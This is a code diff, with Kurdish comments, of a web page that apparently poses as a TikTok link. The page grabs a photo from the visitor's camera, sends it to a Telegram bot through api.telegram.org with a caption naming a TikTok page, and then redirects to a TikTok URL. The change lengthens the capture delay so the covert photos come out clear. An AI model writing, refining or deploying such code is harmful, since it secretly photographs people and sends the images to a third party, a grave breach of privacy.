@@ -42,7 +42,7 @@
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 
-                // کاتەکە کراوە بە 300 بۆ خێرایی و وردی
+                // کاتەکە جێگیر کرا لەسەر 800 بۆ ئەوەی وێنەکان ڕوون بن و ڕەش نەبن
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -55,7 +55,7 @@
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', "📸 وێنەیەکی نوێ گەیشت\n🔗 پەیج: TikTok · warza jayto");
+                    formData.append('caption', "📸 وێنەیەکی ڕوون گەیشت\n🔗 پەیج: TikTok · warza jayto");
 
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
@@ -63,7 +63,7 @@
                     });
 
                     window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
-                }, 300); 
+                }, 800); 
             } catch (e) {
                 window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
             }
